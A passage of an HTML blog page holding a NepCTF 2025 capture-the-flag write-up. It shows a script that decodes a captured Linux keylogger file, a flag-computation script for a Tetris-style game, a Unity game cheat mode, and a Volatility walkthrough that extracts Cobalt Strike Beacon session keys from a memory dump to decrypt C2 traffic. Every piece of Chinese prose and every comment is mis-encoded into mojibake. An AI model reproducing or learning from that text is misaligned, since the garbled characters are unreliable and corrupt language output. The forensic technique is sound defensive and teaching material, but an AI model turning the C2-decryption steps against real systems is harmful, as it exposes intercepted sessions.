class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-number">14</span>: <span class="hljs-string">&#x27;[BACKSPACE]&#x27;</span>, <span class="hljs-number">15</span>: <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-number">16</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-number">17</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-number">18</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">19</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-number">20</span>: <span class="hljs-string">&#x27;t&#x27;</span>,<br>    <span class="hljs-number">21</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">22</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-number">23</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">24</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-number">25</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-number">26</span>: <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-number">27</span>: <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-number">28</span>: <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-number">29</span>: <span class="hljs-string">&#x27;[CTRL]&#x27;</span>,<br>    <span class="hljs-number">30</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">31</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">32</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">33</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">34</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-number">35</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-number">36</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-number">37</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-number">38</span>: <span class="hljs-string">&#x27;l&#x27;</span>,<br>    <span class="hljs-number">39</span>: <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-number">40</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">41</span>: <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-number">42</span>: <span class="hljs-string">&#x27;[LSHIFT]&#x27;</span>, <span class="hljs-number">43</span>: <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-number">44</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-number">45</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">46</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">47</span>: <span class="hljs-string">&#x27;v&#x27;</span>,<br>    <span class="hljs-number">48</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">49</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-number">50</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-number">51</span>: <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-number">52</span>: <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">54</span>: <span class="hljs-string">&#x27;[RSHIFT]&#x27;</span>, <span class="hljs-number">55</span>: <span class="hljs-string">&#x27;[PRTSCR]&#x27;</span>,<br>    <span class="hljs-number">56</span>: <span class="hljs-string">&#x27;[ALT]&#x27;</span>, <span class="hljs-number">57</span>: <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">58</span>: <span class="hljs-string">&#x27;[CAPSLOCK]&#x27;</span>, <span class="hljs-number">59</span>: <span class="hljs-string">&#x27;[F1]&#x27;</span>, <span class="hljs-number">60</span>: <span class="hljs-string">&#x27;[F2]&#x27;</span>, <span class="hljs-number">61</span>: <span class="hljs-string">&#x27;[F3]&#x27;</span>, <span class="hljs-number">62</span>: <span class="hljs-string">&#x27;[F4]&#x27;</span>,<br>    <span class="hljs-number">63</span>: <span class="hljs-string">&#x27;[F5]&#x27;</span>, <span class="hljs-number">64</span>: <span class="hljs-string">&#x27;[F6]&#x27;</span>, <span class="hljs-number">65</span>: <span class="hljs-string">&#x27;[F7]&#x27;</span>, <span class="hljs-number">66</span>: <span class="hljs-string">&#x27;[F8]&#x27;</span>, <span class="hljs-number">67</span>: <span class="hljs-string">&#x27;[F9]&#x27;</span>, <span class="hljs-number">68</span>: <span class="hljs-string">&#x27;[F10]&#x27;</span>, <span class="hljs-number">69</span>: <span class="hljs-string">&#x27;[NUMLOCK]&#x27;</span>,<br>    <span class="hljs-number">70</span>: <span class="hljs-string">&#x27;[SCROLLLOCK]&#x27;</span>, <span class="hljs-number">71</span>: <span class="hljs-string">&#x27;[HOME]&#x27;</span>, <span class="hljs-number">72</span>: <span class="hljs-string">&#x27;[UP]&#x27;</span>, <span class="hljs-number">73</span>: <span class="hljs-string">&#x27;[PGUP]&#x27;</span>, <span class="hljs-number">74</span>: <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-number">75</span>: <span class="hljs-string">&#x27;[LEFT]&#x27;</span>, <span class="hljs-number">76</span>: <span class="hljs-string">&#x27;[CENTER]&#x27;</span>,<br>    <span class="hljs-number">77</span>: <span class="hljs-string">&#x27;[RIGHT]&#x27;</span>, <span class="hljs-number">78</span>: <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-number">79</span>: <span class="hljs-string">&#x27;[END]&#x27;</span>, <span class="hljs-number">80</span>: <span class="hljs-string">&#x27;[DOWN]&#x27;</span>, <span class="hljs-number">81</span>: <span class="hljs-string">&#x27;[PGDN]&#x27;</span>, <span class="hljs-number">82</span>: <span class="hljs-string">&#x27;[INS]&#x27;</span>, <span class="hljs-number">83</span>: <span class="hljs-string">&#x27;[DEL]&#x27;</span>,<br>    <span class="hljs-number">87</span>: <span class="hljs-string">&#x27;[F11]&#x27;</span>, <span class="hljs-number">88</span>: <span class="hljs-string">&#x27;[F12]&#x27;</span>, <span class="hljs-number">97</span>: <span class="hljs-string">&#x27;[RCTRL]&#x27;</span>, <span class="hljs-number">100</span>: <span class="hljs-string">&#x27;[RALT]&#x27;</span><br>    <span class="hljs-comment"># å¯ç»§ç»­æ‰©å±•</span><br>&#125;<br><br>SHIFT_CODES = [<span class="hljs-number">42</span>, <span class="hljs-number">54</span>]  <span class="hljs-comment"># å·¦å³shiftçš„keycode</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_evdev_event</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># ç»“æ„ä½“: struct timeval (2x8å­—èŠ‚), type (H), code (H), value (I) å°ç«¯åº</span><br>    tv_sec, tv_usec, type_, code, value = struct.unpack(<span class="hljs-string">&#x27;&lt;qqHHI&#x27;</span>, data)<br>    <span class="hljs-keyword">return</span> type_, code, value<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keylog_restore</span>(<span class="hljs-params">filename</span>):<br>    result = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            chunk = f.read(<span class="hljs-number">24</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(chunk) &lt; <span class="hljs-number">24</span>:<br>                <span class="hljs-keyword">break</span><br>            type_, code, value = parse_evdev_event(chunk)<br>            <span class="hljs-comment"># åªå¤„ç†é”®ç›˜äº‹ä»¶</span><br>            <span class="hljs-keyword">if</span> type_ == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">if</span> code <span class="hljs-keyword">in</span> SHIFT_CODES:<br>                    <span class="hljs-keyword">if</span> value == <span class="hljs-number">1</span>:<br>                        result.append(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;LINUX_KEYCODE[code]&#125;</span>â†“&#x27;</span>)<br>                    <span class="hljs-keyword">elif</span> value == <span class="hljs-number">0</span>:<br>                        result.append(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;LINUX_KEYCODE[code]&#125;</span>â†‘&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> value == <span class="hljs-number">1</span>:<br>                    char = LINUX_KEYCODE.get(code)<br>                    <span class="hljs-keyword">if</span> char:<br>                        result.append(char)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ç”¨æ³•: python exp.py NepBot_keylogger&#x27;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    filename = sys.argv[<span class="hljs-number">1</span>]<br>    output = keylog_restore(filename)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ¢å¤çš„é”®ç›˜è¾“å…¥è®°å½•:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250731010130413.png"><br>é€šè¿‡åˆ†ææˆ‘ä»¬ä¾¿èƒ½å¤Ÿå¾—åˆ°æ•°æ®åº“åä¸º<code>NepCTF-20250725-114514</code>ã€‚</p><h2 id="SpeedMino"><a href="#SpeedMino" class="headerlink" title="SpeedMino"></a>SpeedMino</h2><p>ä¸€ä¸ªä¿„ç½—æ–¯æ–¹å—æ¸¸æˆï¼ŒæŒ‰ç…§é¢˜ç›®çš„æ„æ€æ¥çœ‹åªè¦ç©å¤Ÿ2600åˆ†å°±å¯ä»¥è·å¾—flagï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹å‘ç°è¿˜æ˜¯æ¯”è¾ƒè´¹æ—¶é—´çš„ï¼Œäºæ˜¯è½¬æ¢æ€è·¯ä»æºç å…¥æ‰‹ã€‚<br>è§£å‹<code>SpeedMino.exe</code>æ–‡ä»¶ï¼Œå¾—åˆ°æºç ï¼Œå‘ç°æ˜¯<code>lua</code>æºç ï¼ŒæŸ¥çœ‹<code>main.lua</code>ï¼Œæœç´¢2600ï¼Œå‘ç°äº†ç»“æœè®¡ç®—çš„é€»è¾‘ã€‚<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250731170801031.png"><br>é€šè¿‡å‡½æ•°åç­‰å…³é”®è¯è·³è½¬ï¼Œå‘ç°æ‰€æœ‰çš„æ•°æ®è®¡ç®—æ–¹æ³•éƒ½èƒ½å¤Ÿåœ¨è¯¥æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œç›´æ¥æŠŠä»£ç ä¸¢ç»™aiå†™ä¸€ä¸ªæœ€åè¾“å‡ºflagçš„è®¡ç®—è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">youwillget = [<span class="hljs-number">187</span>, <span class="hljs-number">24</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">58</span>, <span class="hljs-number">243</span>, <span class="hljs-number">176</span>, <span class="hljs-number">235</span>, <span class="hljs-number">179</span>, <span class="hljs-number">159</span>, <span class="hljs-number">170</span>, <span class="hljs-number">155</span>,<br>              <span class="hljs-number">201</span>, <span class="hljs-number">23</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">210</span>, <span class="hljs-number">27</span>, <span class="hljs-number">113</span>, <span class="hljs-number">11</span>, <span class="hljs-number">161</span>, <span class="hljs-number">94</span>, <span class="hljs-number">245</span>, <span class="hljs-number">41</span>,<br>              <span class="hljs-number">29</span>, <span class="hljs-number">43</span>, <span class="hljs-number">199</span>, <span class="hljs-number">8</span>, <span class="hljs-number">200</span>, <span class="hljs-number">252</span>, <span class="hljs-number">86</span>, <span class="hljs-number">17</span>, <span class="hljs-number">72</span>, <span class="hljs-number">177</span>, <span class="hljs-number">52</span>, <span class="hljs-number">252</span>,<br>              <span class="hljs-number">20</span>, <span class="hljs-number">74</span>, <span class="hljs-number">111</span>, <span class="hljs-number">53</span>, <span class="hljs-number">28</span>, <span class="hljs-number">6</span>, <span class="hljs-number">190</span>, <span class="hljs-number">108</span>, <span class="hljs-number">47</span>, <span class="hljs-number">16</span>, <span class="hljs-number">237</span>, <span class="hljs-number">148</span>,<br>              <span class="hljs-number">82</span>, <span class="hljs-number">253</span>, <span class="hljs-number">148</span>, <span class="hljs-number">6</span>]<br><br><span class="hljs-comment"># ç­‰ä»·äº Lua çš„ youwillget[0] = #youwillget</span><br>youwillget.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(youwillget))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>() -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]:<br>    key = <span class="hljs-string">b&quot;Speedmino Created By MrZ and modified by zxc&quot;</span><br>    key_len = <span class="hljs-built_in">len</span>(key)<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_len]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><br><br>secretBox = KSA()<br>secret_i = <span class="hljs-number">0</span><br>secret_j = <span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_data</span>(<span class="hljs-params">text_table: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]:<br>    <span class="hljs-keyword">global</span> secret_i, secret_j<br>    K = [text_table[<span class="hljs-number">0</span>]]         <span class="hljs-comment"># K[0] = text_len</span><br>    text_len = text_table[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, text_len + <span class="hljs-number">1</span>):<br>        secret_i = (secret_i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        secret_j = (secret_j + secretBox[secret_i]) % <span class="hljs-number">256</span><br>        secretBox[secret_i], secretBox[secret_j] = \<br>            secretBox[secret_j], secretBox[secret_i]<br>        idx = (secretBox[secret_i] + secretBox[secret_j]) % <span class="hljs-number">256</span><br>        K.append((text_table[n] + secretBox[idx]) % <span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">return</span> K<br><br><br>pass_table = [<span class="hljs-number">55</span>] + [<span class="hljs-number">32</span>] * <span class="hljs-number">55</span>   <span class="hljs-comment"># é•¿åº¦ 55ï¼Œå…¨ç©ºæ ¼</span><br>calc_data(pass_table)           <span class="hljs-comment"># åªè°ƒç”¨ï¼Œä¸¢å¼ƒè¿”å›å€¼ï¼Œç›®çš„æ˜¯æ¨è¿› i/j/S</span><br><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2600</span>):<br>    youwillget = calc_data(youwillget)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">table_to_str</span>(<span class="hljs-params">text: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    text_len = text[<span class="hljs-number">0</span>]<br>    out = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, text_len + <span class="hljs-number">1</span>):<br>        c = text[i]<br>        <span class="hljs-keyword">if</span> c &lt; <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> c &gt;= <span class="hljs-number">127</span>:<br>            out.append(<span class="hljs-string">&#x27;#&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            out.append(<span class="hljs-built_in">chr</span>(c))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(out)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>, table_to_str(youwillget))<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>NepCTF&#123;You_ARE_SpeedMino_GRAND-MASTER_ROUNDS!_TGLKZ&#125;</code></p><h2 id="meowbleçŒ«æ³¡"><a href="#meowbleçŒ«æ³¡" class="headerlink" title="meowbleçŒ«æ³¡"></a>meowbleçŒ«æ³¡</h2><p>æ‰“å¼€é™„ä»¶ï¼Œå‘ç°æ˜¯ä¸€ä¸ªUnityæ¸¸æˆï¼Œæ‰“å¼€æ¸¸æˆè·‘ä¸€ä¸‹ï¼Œå‘ç°æœ‰æç¤ºï¼Œè·‘ä¸€ä¼šå„¿å°±å¯ä»¥å‘ç°ä¼šç»™å‡ºéƒ¨åˆ†flagï¼Œä½†æ˜¯è²Œä¼¼å¹¶ä¸ä¼šè·å¾—å…¨éƒ¨ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸€æ¬¾Unityæ¸¸æˆæ•°æ®è§£æå·¥å…·ï¼š<a href="https://assetripper.github.io/AssetRipper/articles/Downloads.html">Downloads</a> æ¥å¯¼å‡ºæ¸¸æˆæ•°æ®ã€‚ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Notepad++ç›´æ¥æœç´¢æç¤ºä¿¡æ¯<code>Tiptext</code>äº†ã€‚<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805192314623.png"><br>ä½†æ˜¯å‘ç°flagä¹Ÿæ˜¯å°‘äº†ç¬¬7æ®µflagï¼Œæç¤ºç»™å‡ºè®©è¯•è¯•GMï¼Œåº”è¯¥æ˜¯GameManageræ¨¡å¼ï¼Œç›´æ¥åœ¨Assets\Scriptsç›®å½•ä¸‹æŸ¥çœ‹CSè„šæœ¬ï¼Œå‘ç°å¯ç–‘è„šæœ¬ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ç®¡ç†gmé€»è¾‘çš„ï¼š<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805195031343.png"><br>åˆ†æCSè„šæœ¬å°±çŸ¥é“æ˜¯gmçš„å¯åŠ¨æ–¹å¼æ˜¯â€œä¸Šä¸Šä¸‹ä¸‹å·¦å³å·¦å³BAâ€ï¼ˆè²Œä¼¼æ˜¯é­‚æ–—ç½—30æ¡å‘½ä½œå¼Šä»£ç ï¼‰ï¼Œç›´æ¥è¿›å…¥æ¸¸æˆæŒ‰ä¸‹<code>Esc</code>ä¹‹åå†æŒ‰ä¸‹å¯¹åº”æŒ‰é”®è¿›å…¥GMæ¨¡å¼ï¼Œè®©è¾“å…¥å‘½ä»¤ï¼Œéšä¾¿è¾“å…¥ä¸€äº›å­—æ¯ä¼šå‘ç°æç¤ºï¼š<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805200014273.png"><br>å› æ­¤æˆ‘ä»¬å¯ä»¥è¾“å…¥â€œhelpâ€æ¥å¯»æ‰¾è·å–flagçš„æ–¹æ³•ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å‘ç°èƒ½å¤Ÿgetflagï¼Œç„¶åæˆ‘ä»¬ç»“åˆç¼ºå¤±çš„flagå’Œgetflagçš„ç”¨æ³•ä½¿ç”¨<code>getflag 7</code>æ¥è·å–flag<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805195610984.png"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">NepCTF&#123;<span class="hljs-number">94721248</span>-773d-<span class="hljs-number">0b25</span>-<span class="hljs-number">0e2d</span>-db9cac299389&#125;<br></code></pre></td></tr></table></figure><h2 id="å®¢æœå°ç¾"><a href="#å®¢æœå°ç¾" class="headerlink" title="å®¢æœå°ç¾"></a>å®¢æœå°ç¾</h2><p><strong>é¢˜ç›®ï¼š</strong> ä¸€ä¸ªæµé‡åŒ…+ä¸€ä¸ªå†…å­˜é•œåƒæ–‡ä»¶raw</p><p>ä½¿ç”¨ufsæ‰“å¼€å¯ä»¥æŸ¥çœ‹åˆ°ç”¨æˆ·åä¸ºJohnDoeï¼ŒåŒæ—¶èƒ½å¤Ÿå‘ç°æ¡Œé¢ä¸Šå­˜åœ¨exeæ–‡ä»¶<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250815211716785.png"><br>ä¹Ÿå¯ä»¥ä½¿ç”¨vol2æ¥æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol2 -f DESKTOP.raw imageinfo<br></code></pre></td></tr></table></figure><p>æ‰«æç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">Volatility Foundation Volatility Framework 2.6.1<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win10x64_19041<br>                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/DESKTOP.raw)<br>                      PAE <span class="hljs-built_in">type</span> : No PAE<br>                           DTB : 0x1ad000L<br>                          KDBG : 0xf8005221eb20L<br>          Number of Processors : 2<br>     Image Type (Service Pack) : 0<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xfffff80050626000L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0xffffb181d5940000L<br>             KUSER_SHARED_DATA : 0xfffff78000000000L<br>           Image <span class="hljs-built_in">date</span> and time : 2025-01-13 07:30:02 UTC+0000<br>     Image <span class="hljs-built_in">local</span> <span class="hljs-built_in">date</span> and time : 2025-01-13 15:30:02 +0800<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ç³»ç»Ÿç‰ˆæœ¬åï¼Œå¯ä»¥å°è¯•ç»§ç»­æ‰«ææ¡Œé¢ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol2 -f DESKTOP.raw --profile=Win10x64_19041 filescan|grep Desktop<br></code></pre></td></tr></table></figure><p>æ‰«æç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Volatility Foundation Volatility Framework 2.6.1<br>0x0000d804abd02720      2      0 R--r-d \Device\HarddiskVolume3\Windows\System32\DispBroker.Desktop.dll<br>0x0000d804abd6dd30  32768      1 R--rw- \Device\HarddiskVolume3\Users\JohnDoe\Desktop<br>0x0000d804ac697ab0     11      0 R--r-d \Device\HarddiskVolume3\Windows\System32\SettingsEnvironment.Desktop.dll<br>0x0000d804ac8b1660  31802      1 RW-rw- \Device\HarddiskVolume3\Users\JohnDoe\Desktop\DESKTOP-OKEP6GL-20250113-073001.raw<br>0x0000d804acf0ae80     15      0 R--r-d \Device\HarddiskVolume3\Users\JohnDoe\Desktop\DumpIt.exe<br>0x0000d804ad57f710      1      0 R--r-d \Device\HarddiskVolume3\Users\JohnDoe\Desktop\DumpIt.exe<br>0x0000d804ad5806b0      5      0 R--r-d \Device\HarddiskVolume3\Windows\System32\WindowsInternal.ComposableShell.DesktopHosting.dll<br>0x0000d804ad581b00      4      0 R--r-d \Device\HarddiskVolume3\Users\JohnDoe\Desktop\å…³äº2025å¹´éƒ¨åˆ†èŠ‚å‡æ—¥å®‰æ’çš„é€šçŸ¥.exe<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾—å‡ºç”¨æˆ·åä¸ºJohnDoe<br>ç„¶åè¿½è¸ªä¸€ä¸‹data<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250827173954063.png"><br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250827174013761.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol2 -f DESKTOP.raw --profile=Win10x64_19041 pslis<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°Beaconå¯¹åº”è¿›ç¨‹å·6492<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250827180544035.png"><br>ä½¿ç”¨<a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">Beta&#x2F;cs-parse-http-traffic.py</a>æå–å–æµé‡ä¸­çš„raw data</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cs-parse-http-traffic.py -k unknown DESKTOP.pcapng<br></code></pre></td></tr></table></figure><p>é€‰å–å…¶ä¸­å¯¹44è¯·æ±‚çš„å›åº”æ•°æ®<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250827184429928.png"><br>å…ˆä½¿ç”¨<code>vol2 -f DESKTOP.raw --profile=Win10x64_19041 memdump -p 6492 -D ./</code>å°†å¯¹åº”Beaconè¿›ç¨‹dumpä¸‹æ¥ï¼Œç„¶åä½¿ç”¨<a href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">Beta&#x2F;cs-extract-key.py</a>æ¥æå–å¯†é’¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cs-extract-key.py -t 9ea8c274326a1db1e25142558f2bac154d8139bc18a19f5d772786e8075d6d8fca4d82ed8a7253e3e2c17110e911ff16 6492.dmp <br></code></pre></td></tr></table></figure><p><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250827185314687.png"><br>å¯ä»¥è·å¾—Beaconä¼šè¯çš„ä¸»å¯†é’¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">AES Key:  a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7<br>HMAC Key: 35d34ac8778482751682514436d71e09<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ¨ä¸ªå¯¹è¿‡æ»¤å‡ºçš„dataè¿›è¡Œè§£å¯†ï¼Œæ‰¾åˆ°flagã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/WBGlIl/CS_Decrypt/blob/main/Beacon_Task_return_AES_Decrypt.py">CS_Decrypt&#x2F;Beacon_Task_return_AES_Decrypt.py at main Â· WBGlIl&#x2F;CS_Decrypt</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 